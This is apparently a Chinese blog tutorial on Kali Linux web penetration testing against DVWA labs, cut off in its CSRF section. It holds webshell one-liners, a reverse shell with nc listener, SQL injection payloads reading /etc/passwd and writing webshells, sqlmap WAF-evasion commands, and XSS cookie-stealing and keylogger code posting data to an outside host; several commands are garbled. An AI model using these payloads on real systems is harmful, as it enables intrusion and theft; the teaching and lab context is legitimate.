<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Kali使用教程（三）：Web渗透</title>
    <url>/2020/07/05/Kali%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B%EF%BC%88%E4%B8%89%EF%BC%89%EF%BC%9AWeb%E6%B8%97%E9%80%8F/</url>
    <content><![CDATA[<h3 id="HTTP协议"><a href="#HTTP协议" class="headerlink" title="HTTP协议"></a>HTTP协议</h3><blockquote><p>明文：<br>无内建的机密性安全机制<br>嗅探或代理截断可查看全部明文信息<br>https只能提高传输层安全<br>无状态：<br>每一次客户端和服务器端的通信都是独立的过程<br>WEB应用需要跟踪客户端会话(多步通信)<br>不使用cookie的应用，客户端每次请求都要重新身份验证(不现实)<br>Session用于在用户身份验证后跟踪用户行为轨迹：<br>提高用户体验，但增加了攻击向量</p></blockquote><a id="more"></a><figure class="highlight less"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Cycle</span>:</span><br><span class="line">	请求/响应</span><br><span class="line">重要的<span class="attribute">header</span>:</span><br><span class="line">    <span class="attribute">Set-Cookie</span>:服务器发给客户端的SessionID ( 被窃取的风险)</span><br><span class="line">    <span class="attribute">Content-Length</span>:响应body部分的字节长度</span><br><span class="line">    <span class="attribute">Location</span>:重定向用户到另一个页面，可识别身份认证后允许访问的页面</span><br><span class="line">    <span class="attribute">Cookie</span>:客户端发回给服务器证明用户状态的信息(头:值成对出现)</span><br><span class="line">    <span class="attribute">Referrer</span>:发起新请求之前用户位于哪个页面，服务器基于此头的安全限制很容</span><br><span class="line">    易被修改绕过</span><br></pre></td></tr></table></figure><h4 id="HTTP协议状态码"><a href="#HTTP协议状态码" class="headerlink" title="HTTP协议状态码"></a>HTTP协议状态码</h4><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">服务端响应的状态码表示响应的结果类型(<span class="number">5</span>大类<span class="number">50</span>多 个具体响应码)</span><br><span class="line"><span class="number">100</span>s:服务器响应的信息，通常表示服务器还有后续处理，很少出现</span><br><span class="line"><span class="number">200</span>s:请求被服务器成功接受并处理后返回的响应结果</span><br><span class="line"><span class="number">300</span>s:重定向，通常在身份认证成功后重定向到一个安全页面(<span class="number">301</span>/<span class="number">302</span>)</span><br><span class="line"><span class="number">400</span>s:表示客户端请求错误</span><br><span class="line">	<span class="number">401</span>:需要身份验证</span><br><span class="line">	<span class="number">403</span>:拒绝访问</span><br><span class="line">	<span class="number">404</span>:目标未发现</span><br><span class="line"><span class="number">500</span>s:服务器内部错误(<span class="number">503</span>: 服务不可用)</span><br><span class="line">http:<span class="comment">//www.w3.org/Protocols/rfc26 1 6/rfc2616 sec 10.html</span></span><br></pre></td></tr></table></figure><hr><h3 id="侦察"><a href="#侦察" class="headerlink" title="侦察"></a>侦察</h3><h4 id="Httrack"><a href="#Httrack" class="headerlink" title="Httrack"></a>Httrack</h4><blockquote><p>使用Httrack去下载目标网站资源，减少与目标系统的交互</p></blockquote><h3 id="扫描工具"><a href="#扫描工具" class="headerlink" title="扫描工具"></a>扫描工具</h3><h4 id="NIKTO"><a href="#NIKTO" class="headerlink" title="NIKTO"></a>NIKTO</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Perl语言开发的开源web安全扫描器</span><br><span class="line">软件版本</span><br><span class="line">搜索存在安全隐患的文件</span><br><span class="line">服务器配置漏洞</span><br><span class="line">插件: nikto -list-plugins</span><br><span class="line">nikto -update</span><br><span class="line">	cirt.net</span><br><span class="line">nikto -host http://1.1.1.1</span><br><span class="line">nikto -host 192.168.1.1 -ssl -port 443</span><br><span class="line">-vhost</span><br><span class="line"></span><br><span class="line">Space - report current scan status</span><br><span class="line">v - verbose mode on/off #可视化扫描</span><br><span class="line">d - debug mode on/off</span><br><span class="line">e - error reporting on/off</span><br><span class="line">p - progress reporting on/off</span><br><span class="line">r- redirect display on/off</span><br><span class="line">C - cookie display on/off</span><br><span class="line">a - auth display on/off</span><br><span class="line">q - quit</span><br><span class="line">N - next host</span><br><span class="line">P - Pause</span><br></pre></td></tr></table></figure><h4 id="vega"><a href="#vega" class="headerlink" title="vega"></a>vega</h4><figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line">JAVA编写的开源Web扫描器：</span><br><span class="line">    扫描模式</span><br><span class="line">    代理模式</span><br><span class="line">    爬站、处理表单、注入测试</span><br><span class="line">    支持<span class="string">SSL :</span> <span class="string">http:</span><span class="comment">//vega/ca.crt</span></span><br></pre></td></tr></table></figure><h4 id="skipfish"><a href="#skipfish" class="headerlink" title="skipfish"></a>skipfish</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">C语言编写</span><br><span class="line">实验性的主动web安全评估工具</span><br><span class="line">递归爬网</span><br><span class="line">基于字典的探测</span><br><span class="line">速度较快</span><br><span class="line">	多路单线程，全异步网络I/O,消除内存管理和调度开销</span><br><span class="line">	启发式自动内容识别</span><br><span class="line">误报较低</span><br><span class="line"></span><br><span class="line">skipfish -0 test http://1.1.1.1 </span><br><span class="line">skipfish -0 test @url.txt</span><br><span class="line">skipfish -0 test -S complet.wl -W a.wl http://1.1.1.1 	#字典</span><br><span class="line">-I :只检查包含string的URL</span><br><span class="line">-X :不检查包含string的URL  #logout</span><br><span class="line">-K :不对指定参数进行Fuzz测试</span><br><span class="line"><span class="meta">	#</span><span class="bash">Fuzz测试，也叫做“模糊测试”，是一种挖掘软件安全漏洞、检测软件健壮性的黑盒测试，它通过向软件输入非法的字段，观测被测试软件是否异常而实现。</span></span><br><span class="line">-D :跨站点爬另外一个域 #即扫描指定域名会跳转的域</span><br><span class="line">-l :每秒最大请求数</span><br><span class="line">-m :每IP最大并发连接数</span><br><span class="line">--config :指定配置文件</span><br><span class="line">身份认证:</span><br><span class="line">	skipfish -A user:pass -0 test http://1.1.1.1 #以表单方式</span><br><span class="line">	skipfish -C "name=val" -0 test http://1.1.1.1 #以cookie方式</span><br><span class="line">示例：</span><br><span class="line">sudo skipfish -o test1 -I /dvwa/  http://192.168.2.105/dvwa</span><br></pre></td></tr></table></figure><blockquote><p>尝试扫描dvwa靶场，结果如下</p></blockquote><p><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200616201151479.png" alt="image-20200616201151479"></p><h4 id="w3af"><a href="#w3af" class="headerlink" title="w3af"></a>w3af</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Web Application Attack and Audit Framework,基于python语言开发</span><br><span class="line">此框架的目标是帮助你发现和利用所有WEB应用程序漏洞</span><br><span class="line">9大类近150个plugin</span><br><span class="line">    audit(常用)</span><br><span class="line">    infrastructure</span><br><span class="line">    grep</span><br><span class="line">    evasion</span><br><span class="line">    mangle</span><br><span class="line">    auth</span><br><span class="line">    bruteforce</span><br><span class="line">    output</span><br><span class="line">    crawl(常用)</span><br><span class="line">安装:</span><br><span class="line">	cd ~</span><br><span class="line">    apt-get update</span><br><span class="line">    apt-get install -y python-pip w3af</span><br><span class="line">    pip install -upgrade pip</span><br><span class="line">    git clone https://github.com/andresriancho/w3af.git</span><br><span class="line">    cd w3af</span><br><span class="line">    ./w3af_console ( ./w3af_ gui)</span><br><span class="line">    apt-get build-dep python-lxml</span><br><span class="line">    ./tmp/w3af_ dependency_ install.sh</span><br></pre></td></tr></table></figure><h4 id="Arachni"><a href="#Arachni" class="headerlink" title="Arachni"></a>Arachni</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Kall自带了旧的arachni阉割版</span><br><span class="line">安装</span><br><span class="line">	http://www.arachni-scanner.com/download/Linux</span><br><span class="line">	tar xvf arachni.tar.gz</span><br><span class="line">    http://localhost:9292/</span><br><span class="line">    admin@admin.admin / administrator</span><br></pre></td></tr></table></figure><ul><li><p>Profile</p><ul><li>Import</li><li>Export</li><li>New</li></ul></li><li><p>Dispatcher（使用RPC服务进行分布式扫描）</p><ul><li>./arachni_ rpcd –address=127.0.0.1 –port=1111 –nickname=test1</li></ul></li><li><p>Grid（加入组，实现负载均衡）</p><ul><li>./arachni_ rpcd - nickname=test2 –address=127.0.0.1 -neighbour=127.0.0.1:1111</li></ul></li><li><p>Scan</p></li></ul><h4 id="OWASP-ZAP"><a href="#OWASP-ZAP" class="headerlink" title="OWASP_ZAP"></a>OWASP_ZAP</h4><blockquote><p>强大的主动扫描工具</p></blockquote><figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line">在新版本kali中已经没有集成该工具，需要自行到官网下载</span><br><span class="line">WEB Application集成渗透测试和漏洞挖掘工具</span><br><span class="line">开源免费跨平台简单易用</span><br><span class="line">截断代理</span><br><span class="line">主动、被动扫描</span><br><span class="line">Fuzzy、暴力破解</span><br><span class="line">API</span><br><span class="line">	- <span class="string">http:</span><span class="comment">//zap/</span></span><br></pre></td></tr></table></figure><blockquote><p>阶段代理：首先在firefox浏览器配置OWASP的代理：ip+端口</p></blockquote><p><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200617163535961.png" alt="image-20200617163535961"></p><blockquote><p>扫描dvwa</p></blockquote><p><img data-src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/image-20200617170103014.png" alt="image-20200617170103014"></p><h4 id="Burpsuite"><a href="#Burpsuite" class="headerlink" title="Burpsuite"></a>Burpsuite</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Web安全工具中的瑞士军刀</span><br><span class="line">统一的集成工具发现全部现代WEB安全漏洞</span><br><span class="line">PortSwigger公司开发</span><br><span class="line">    Burp Free</span><br><span class="line">    Burp Professional</span><br><span class="line">    http://www .portswigger.net</span><br><span class="line">所有的工具共享一个能处理并显示HTTP消息的可扩展框架，模块之间无缝交</span><br><span class="line">换信息。</span><br><span class="line">Proxy：</span><br><span class="line">	Options</span><br><span class="line">	Invisible (主机头/多目标域名)</span><br><span class="line"><span class="meta">		#</span><span class="bash">即非浏览器客户端，不支持http代理时使用</span></span><br><span class="line">	CA (导入/导出)</span><br><span class="line">	Intercept (入站 /出站)</span><br><span class="line">	Response modify</span><br><span class="line">Target： #这里主要显示目标站点结构</span><br><span class="line">	Scope (logout)</span><br><span class="line">	Filter</span><br><span class="line">	Comparing site map</span><br><span class="line">Intruder: #侵入，使用各类字典、正则、生成器来匹配登录账号或密码</span><br><span class="line">	Position：#进行匹配替换的请求头</span><br><span class="line">	Payloads：#填充数据的方式</span><br><span class="line"><span class="meta">	#</span><span class="bash">可以从Target入口找到目标站点，右键send到Intruder</span></span><br><span class="line">Repeater：#对指定页面进行request和查看response。同样可以通过send进入</span><br><span class="line">    Request History</span><br><span class="line">    Change request method</span><br><span class="line">    Change body encoding</span><br><span class="line">    Copy as curl command</span><br><span class="line">    Convert selection</span><br><span class="line">    Repeater菜单</span><br><span class="line">        Engagement tools--generate csrf PoC</span><br><span class="line">        Follow redirections</span><br><span class="line">        Process cookies in redirections</span><br><span class="line">Sequencer: #分析cookie的随机性，含各种指标</span><br><span class="line">	分析程序中可预测的数据</span><br><span class="line">	Session cookies</span><br><span class="line">	anti-CSRF tokens</span><br><span class="line">	Start live capture</span><br><span class="line">		Analyze (数据越多分析越准确)</span><br><span class="line">		伪随机数算法</span><br><span class="line">		Character-level</span><br><span class="line">		Bit-level</span><br><span class="line">	FIPS-美国联邦信息 处理标准(Federal Information Processingstandard)</span><br></pre></td></tr></table></figure><hr><h3 id="手动漏洞挖掘"><a href="#手动漏洞挖掘" class="headerlink" title="手动漏洞挖掘"></a>手动漏洞挖掘</h3><h4 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">PHP反弹shell：</span><br><span class="line">	/us/share/webshells/php/php-reverse-shell.php #kali自带的反弹木马</span><br><span class="line">	nc -lvp 4444 #监听弹回的shell</span><br><span class="line">File：</span><br><span class="line">	Whereis</span><br><span class="line">		lfconfig</span><br><span class="line">写入webshell</span><br><span class="line">	echo "&lt;?php \$cmd= \$_ GET["'cmd";system(\$cmd);?&gt;" &gt;</span><br><span class="line">	/var/www/3.php	</span><br><span class="line"><span class="meta">#</span><span class="bash">关于一句话反弹shell可以参考：https://zhuanlan.zhihu.com/p/30170345</span></span><br></pre></td></tr></table></figure><h4 id="会话sessionID"><a href="#会话sessionID" class="headerlink" title="会话sessionID"></a>会话sessionID</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Xss / cookie importer</span><br><span class="line">    SessionID in URL</span><br><span class="line">    嗅探</span><br><span class="line">    SessionID长期不变/永久不变</span><br><span class="line">    SessionID生成算法：</span><br><span class="line">        Sequencer</span><br><span class="line">        私有算法</span><br><span class="line">        预判下- -次登陆时生成的SessionID</span><br><span class="line">        登出后返回测试</span><br><span class="line">        salt #加盐</span><br></pre></td></tr></table></figure><h4 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&lt;?php echo shell_exec($_ GET['cmd']);?&gt;</span><br><span class="line">    直接上传webshell</span><br><span class="line">    修改文件类型上传webshell</span><br><span class="line">        Mimetype-文件头、 扩展名 </span><br><span class="line">        # 使用burpsuite阶段代理，然后强制修改请求头（能过medium）</span><br><span class="line">        # Mimetype会根据文件前10个字节判断文件类型，所以有时候修改后缀是无效的</span><br><span class="line">        # 对于high级别，可以修改文件名为xx.php.jpg。可以绕过文件后缀检测</span><br><span class="line">        # 一些严格检测会检测文件字节数据，判断文件类型。需要直接修改文件内容上传</span><br><span class="line">        # 一般会对上传文件目录设置只读权限</span><br></pre></td></tr></table></figure><h4 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">服务器端程序将用户输入参数作为查询条件，直接拼接SQL语句，并将查询结果返回给客户端浏	览器</span><br><span class="line">用户登录判断：</span><br><span class="line">    SELECT * FROM users WHERE user= 'uname' AND password= ' pass'</span><br><span class="line">    SELECT * FROM users WHERE user=‘name' AND password=" OR "='</span><br><span class="line">基于报错的检测方法(low)</span><br><span class="line">    '"%( )</span><br><span class="line">基于布尔的检测</span><br><span class="line">    1' and '1'='1    /    1' and '1</span><br><span class="line">    1' and‘1'='2     /    1' and‘0</span><br><span class="line">表列数/显示信息位于哪一列</span><br><span class="line">	'order by 9--     #按查询列号排序(注释符: -- )</span><br><span class="line">	select *时表字段数=查询字段数</span><br><span class="line">联合查询</span><br><span class="line">    ' union select 1,2--</span><br><span class="line">    ' union all select database(),2--</span><br><span class="line">读取文件</span><br><span class="line">	' union SELECT null, load_ file('/etc/passwd)--+</span><br><span class="line">写入文件</span><br><span class="line">	' union select null,"&lt;?php passthru($_ GET['cmd]); ?&gt;" INTO DUMPFILE</span><br><span class="line">	"/var/www/a.php" -+</span><br><span class="line">Mysql账号</span><br><span class="line">	cat php-revers-shell.php | xxd -PS | tr-d ^\n'</span><br><span class="line">	' union select null, (0x3c3f706870) INTO DUMPFILE '/tmp/x.php'--</span><br><span class="line">保存下载数据库</span><br><span class="line">	' union select null, concat(user,0x3a,password) from users INTOOUTFILE</span><br><span class="line">	'/tmp/a.db-</span><br></pre></td></tr></table></figure><h4 id="SQL盲注"><a href="#SQL盲注" class="headerlink" title="SQL盲注"></a>SQL盲注</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">不显示数据库内建的报错信息</span><br><span class="line">	内建的报错信息帮助开发人员发现和修复问题</span><br><span class="line">	报错信息提供关于系统的大量有用信息</span><br><span class="line">当程序员隐藏了数据库内建报错信息，替换为通用的错误提示，sql注入将无法依据报错信息判断注入语句的执行结果，即盲注</span><br><span class="line">思路:既然无法基于报错信息判断结果，基于逻辑真假的不同结果来判断</span><br><span class="line">    1' and 1=1--+</span><br><span class="line">    1' and 1=2--+</span><br></pre></td></tr></table></figure><h4 id="SQLMAP自动注入"><a href="#SQLMAP自动注入" class="headerlink" title="SQLMAP自动注入"></a>SQLMAP自动注入</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">开源sq|注入漏洞检测、利用工具</span><br><span class="line">检测动态页面中get/post参数、cookie、 http头</span><br><span class="line">数据榨取</span><br><span class="line">文件系统访问</span><br><span class="line">操作系统命令执行</span><br><span class="line">引擎强大、特性丰富</span><br><span class="line">Xss漏洞检测</span><br><span class="line">五种漏洞检测技术</span><br><span class="line">    基于布尔的盲注检测</span><br><span class="line">    基于时间的盲注检测</span><br><span class="line">		'and (select * from (selectseel(0)))a)-+</span><br><span class="line">	基于错误的检测</span><br><span class="line">	基于UNION联合查询的检测</span><br><span class="line">	适用于通过for循环直接输出联合查询结果，否则只显示第-项结果</span><br><span class="line">	基于堆叠查询的检测</span><br><span class="line">		堆叠多个查询语句</span><br><span class="line">		适用于非select的数据修改、删除的操作</span><br><span class="line">	支持的数据库管理系统DBMS</span><br><span class="line">		MySQL, Oracle, PostgreSQL, Microsoft SQL Server, Microsoft Access, 			IBM DB2, sQLite,Firebird, Sybase，SAP MaxDB</span><br><span class="line">Get方法</span><br><span class="line">	sqlmap -U "http://192.1 68.20.10/mutillidae/index.php?page=user-</span><br><span class="line">	info.php&amp;username= 1 1 &amp;password=22&amp;user-info-php-submit-		button=View+Account+Details" -P username -f</span><br><span class="line">扫描URL列表文件</span><br><span class="line">	http://1.1.1.1/vuIn1 .php?q=foobar</span><br><span class="line">	http://1.1.1.1/vuln3/id/1*</span><br><span class="line">	sqlmap. -m list.txt</span><br><span class="line">扫描google搜索结果</span><br><span class="line">	sqlmap.py -g "inud:\".php?id=1\"</span><br><span class="line">POST方法</span><br><span class="line">	使用http请求文件(burpsuite )</span><br><span class="line">		sqlmap 1 request.txt</span><br><span class="line">	使用burpsuite log文件</span><br><span class="line">		sqlmap 1 log.txt</span><br><span class="line">HTTPS</span><br><span class="line">	sqlmap -U "https://1.1.1.1 /a,php?id= 1:8843" --force-ss</span><br><span class="line">扫描配置文件</span><br><span class="line">	sqlmap -C sqlmap.conf</span><br><span class="line">数据段:  --data</span><br><span class="line">	get / post都适用</span><br><span class="line">	sqlmap -U "http://1.1.1.1/a.php" -data="user= l&amp;pass=2" -f</span><br><span class="line">变量分隔符: -param-del</span><br><span class="line">	http://1.1.1.l/a.php?q=foo;id=1 // ;  &amp;</span><br><span class="line">	sqlmap -U "http://1.1.1.1 /a.php" -data="q=foo;id=1" -param-del="," -f</span><br><span class="line">cookie头:  --cookie</span><br><span class="line">	web应用需要基于cookie的身份认证</span><br><span class="line"><span class="meta">	#</span><span class="bash">检查cookie中的注入点(sqlmap自动测试),需要--level = 2级才会检测</span></span><br><span class="line">	Set-Cookie / -drop-set-cookie</span><br><span class="line">-user-agent：</span><br><span class="line">	sqlmap/1.0-dex-0xxxx (http://sqlmap.org)</span><br><span class="line">--random-agent #sqlmap的useragent很容易被服务器过滤掉，因此需要伪造成浏览器的</span><br><span class="line">	/usr/share/sqlmap/txt/user-agents.txt</span><br><span class="line">sqlmap检查user-agent中的注入点: #Level&gt;= 3</span><br><span class="line">APP/WAF/IPS/IDS过滤异常user-agent时报错</span><br><span class="line">    [hh:mm:20] [ERROR] the target URL responded with an unknown HTTP</span><br><span class="line">    status code, try to force the HTTP User-Agent header with option ser</span><br><span class="line">    agent or --random-agent</span><br><span class="line">Host头: --host</span><br><span class="line"><span class="meta">	#</span><span class="bash">Level =5</span></span><br><span class="line">Referer头: -referrer</span><br><span class="line"><span class="meta">	#</span><span class="bash">Level &gt;=3</span></span><br><span class="line">额外的header: --headers</span><br><span class="line">	每个头单独一行(名称区分大小写)</span><br><span class="line">	sqlmap. -∪"http://l.1.1.1/a.php?id=1" -</span><br><span class="line">	headers=' "host:www.a.com\nUser-Agent:yuanfh"</span><br><span class="line">--method=GET/POST</span><br><span class="line">--skip-urlencode</span><br><span class="line">    默认Get方法会对传输内容进行编码，某些WEB服务器不遵守RFC标准编码，使</span><br><span class="line">    用原始字符提交数据</span><br><span class="line">--keep-alive</span><br><span class="line">    使用http(s)长连接，性能好</span><br><span class="line">    与--proxy参数不兼容</span><br><span class="line">    长连接避免重复建立连接的网络开销，但大量长连接会严重占用服务器资源</span><br><span class="line">--tamper</span><br><span class="line">    混淆脚本，用于绕过应用层过滤、IPS、 WAF</span><br><span class="line">    sqlmap -U "http://1.1.1.1/a.php?id=1" --</span><br><span class="line">    tamper=" tamper/between.py.tamper/randomcase.py.tamper/space2c</span><br><span class="line">    omment.py"-v 3</span><br><span class="line">    </span><br><span class="line">Mysql&lt; 5.0 ,没有information schema 库</span><br><span class="line"><span class="meta">Mysql&gt;</span><span class="bash">= 5.0，但无权读取information. schema库</span></span><br><span class="line">微软的access数据库，</span><br><span class="line">默认无权读取MSysObjects库</span><br><span class="line">--common-tables	#对数据库表进行暴力破解（跑字典）</span><br><span class="line">--common-columns #暴力破解数据库列</span><br><span class="line">				(Access系统表无列信息)</span><br></pre></td></tr></table></figure><h4 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h4><blockquote><p>XSS攻击分为反射型，DOM型和持久型，持久性是注入到目标服务器，反射型是引诱用户点击跨站脚本；基于DOM型的XSS是不需要与服务器端交互的,它只发生在客户端处理数据阶段。</p></blockquote><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">攻击WEB客户端</span><br><span class="line">客户端脚本语言</span><br><span class="line">    弹窗告警、广告</span><br><span class="line">    Javascript</span><br><span class="line">    在浏览器中执行</span><br><span class="line">XSS (cross-site scripting)</span><br><span class="line">    通过WEB站点漏洞，向客户端交付恶意脚本代码，实现对客户端的攻击目的</span><br><span class="line">    注入客户端脚本代码</span><br><span class="line">    盗取cookie、</span><br><span class="line">    重定向</span><br><span class="line">VBScript, ActiveX, or Flash</span><br><span class="line">JavaScript</span><br><span class="line">    与Java语言无关</span><br><span class="line">    命名完全出于市场原因</span><br><span class="line">    使用最广的客户端脚本语言</span><br><span class="line">使用场景</span><br><span class="line">    直接嵌入html: <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript"> alert(<span class="string">'XSS'</span>); </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    元素标签事件: <span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">alert(</span>'<span class="attr">XSS</span>')&gt;</span></span><br><span class="line">    图片标签: <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"avascript:alert('XSS');"</span>&gt;</span></span><br><span class="line">    其他标签: <span class="tag">&lt;<span class="name">iframe</span>&gt;</span>, <span class="tag">&lt;<span class="name">div</span>&gt;</span>, and <span class="tag">&lt;<span class="name">link</span>&gt;</span></span><br><span class="line">    DOM对象，篡改页面内容  </span><br><span class="line">        </span><br><span class="line">窃取cookie <span class="comment">&lt;!--通过外链引入跨站脚本--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">http://1.1.1.1/a.js</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">a.js源码</span><br><span class="line">    var img = new Image();</span><br><span class="line">    img.src = "http://1.1.1.1/cookies ,php?cookie="+ document.cookie;</span><br></pre></td></tr></table></figure><ul><li>攻击实例：<code>键盘记录</code></li></ul><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">#攻击代码</span><br><span class="line">#Keylogger.js</span><br><span class="line"><span class="built_in">document</span>.onkeypress = <span class="function"><span class="keyword">function</span>(<span class="params">evt</span>) </span>&#123;</span><br><span class="line">    evt= evt || <span class="built_in">window</span>.event</span><br><span class="line">    key = <span class="built_in">String</span>.fromCharCode(evt.charCode)</span><br><span class="line">    <span class="keyword">if</span> (key) &#123;</span><br><span class="line">        <span class="keyword">var</span> http = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">        <span class="keyword">var</span> param = encodeURl(key)</span><br><span class="line">        http,open(<span class="string">"PST,"</span>http:<span class="comment">//192.1 68.20.8/keylogger.php." ,true);</span></span><br><span class="line">        http.setRequestHeader<span class="string">'"Content-type","application/x-www-form-urlencoded"),</span></span><br><span class="line"><span class="string">        http.send("key="+param);</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">#接收端</span></span><br><span class="line"><span class="string">#Keylogger.php</span></span><br><span class="line"><span class="string">&lt;?php</span></span><br><span class="line"><span class="string">    $key=$POST['</span>key<span class="string">'];</span></span><br><span class="line"><span class="string">    $logfile="keylog.txt";</span></span><br><span class="line"><span class="string">    $fp = fopen($logfile, "a");</span></span><br><span class="line"><span class="string">    fwrite($fp, $key);</span></span><br><span class="line"><span class="string">    fclose($fp);</span></span><br><span class="line"><span class="string">?&gt;</span></span><br><span class="line"><span class="string">#引入XSS脚本到浏览器</span></span><br><span class="line"><span class="string">&lt;script src="http://1.1.1.1/keylogger.js"&gt;&lt;/script&gt;</span></span><br><span class="line"><span class="string">#点击下面的页面会跳转到初始网页，并开始记录键盘</span></span><br><span class="line"><span class="string">&lt;a href="http://192.168.20.10/dvwa/vulnerabilities/xss_r/?name=&lt;script src='</span>http:<span class="comment">//192.168.20.8/keyloggerjs'&gt;&lt;/script&gt;"&gt;xss&lt;/a&gt;</span></span><br></pre></td></tr></table></figure><h4 id="反射型XSS和Xsser工具"><a href="#反射型XSS和Xsser工具" class="headerlink" title="反射型XSS和Xsser工具"></a>反射型XSS和Xsser工具</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Xsser</span><br><span class="line">	命令行/图形化工具</span><br><span class="line">	绕过服务器端输入筛选</span><br><span class="line">		10进制/ 16进制编码</span><br><span class="line">		unescape()</span><br><span class="line">xsser -u "http://1.1.1.1/dvwa/vuInerabilities/" -g "xss_r/?name=" --cookie="security=low; PHPSESSID=d23e469411707ff8210717e67c521a81" -s</span><br><span class="line">-v --reverse-check </span><br><span class="line"><span class="meta">	#</span><span class="bash"> -u代表url，-g代表get请求， -s代表请求次数统计， -v可视化，--reverse-check连接本机测试</span></span><br><span class="line">-heuristic #检查被过滤的字符</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">对payload编码，绕过服务器端筛选过滤</span></span><br><span class="line">-Str Use method String.FromCharCode()</span><br><span class="line">-Une Use Unescape() function</span><br><span class="line">-Mix Mix String.FromCharCode() and Unescape()</span><br><span class="line">-Dec Use Decimal encoding</span><br><span class="line">-Hex Use Hexadecimal encoding</span><br><span class="line">-Hes Use Hexadecimal encoding, with semicolons</span><br><span class="line">-Dwo Encode vectors iIP addresses in DWORD</span><br><span class="line">-Doo Encode vectors IP addresses in Octal</span><br><span class="line">-Cem=CEM Try-manually- different Character Encoding Mutatiohs</span><br><span class="line">(reverse obfuscation: good) -&gt; (ex: 'Mix,Une,Str.Hex')</span><br></pre></td></tr></table></figure><blockquote><p>针对DVWA high安全级别进行XSS攻击，发现是无法攻击的</p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">xsser -U "http://1.1.1.1/dwwa/vuInerabilities/" -g "xss_ r/?name=" -</span><br><span class="line">cookie="security=high; PHPSESSID=d23e46941 1707f82107 17e67c521q817</span><br><span class="line">-Cem=' Mix,Une,Str.Hex'</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># high安全级别会使用htmlspecialchars()函数会将web代码转换成字符串</span></span></span><br><span class="line">							## 例如：&lt;   &gt;   转换成  &amp;lt; &amp;gt;</span><br></pre></td></tr></table></figure><h4 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h4><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">存储型XSS</span><br><span class="line">    长期存储于服务器端</span><br><span class="line">    每次用户访问都会被执行javascript脚本</span><br><span class="line">Name: # 一般客户端表单会有长度限制</span><br><span class="line">	  # 可以通过客户端修改html代码或者截断代理突破限制</span><br><span class="line">&lt;script src=http:<span class="comment">//1.1.1.1/a.js&gt;&lt;/script&gt;</span></span><br><span class="line">a.js源码: </span><br><span class="line">    <span class="keyword">var</span> img = <span class="keyword">new</span> Image();</span><br><span class="line">    img.src = <span class="string">"http://1.1.1.1:88/cookies.php?cookie="</span>+<span class="built_in">document</span>.cookie;</span><br></pre></td></tr></table></figure><h4 id="BEEF"><a href="#BEEF" class="headerlink" title="BEEF"></a>BEEF</h4><blockquote><p>浏览器漏洞利用框架</p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">浏览器攻击面</span><br><span class="line">    应用普遍转移到B / S架构，浏览器成为统一客户端程序</span><br><span class="line">    结合社会，工程学方法对浏览器进行攻击</span><br><span class="line">    攻击浏览器用户</span><br><span class="line">    通过注，入的JS脚本，利用浏览器攻击其他网站</span><br><span class="line">BeEF (Browser exploitation framework )</span><br><span class="line">    生成、交付payload</span><br><span class="line">    Ruby语言编写</span><br><span class="line">    服务器端:管理hooked客户端</span><br><span class="line">    客户端:运行于客户端浏览器的Javascript脚本(hook )</span><br></pre></td></tr></table></figure><h4 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h4><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">Cross site request forgery #跨站请求伪造</span><br><span class="line">与XSS经常混淆</span><br><span class="line">从信任的角度来区分</span><br><span class="line">    XSS:利用用户对站点的信任</span><br><span class="line">    CSRF:利用站点对已经身份认证的信任</span><br><span class="line">结合社工在身份认证会话过程中实现攻击</span><br><span class="line">    修改账号密码、个人信息(email、 收货地址)</span><br><span class="line">    发送伪造的业务请求(网银、购物、投票)</span><br><span class="line">    关注他人社交账号、推送博文</span><br><span class="line">    在用户非自愿、不知情的情况下提交请求</span><br><span class="line"># DVWA低安全级别不会对修改密码过程进行确认验证</span><br><span class="line"># 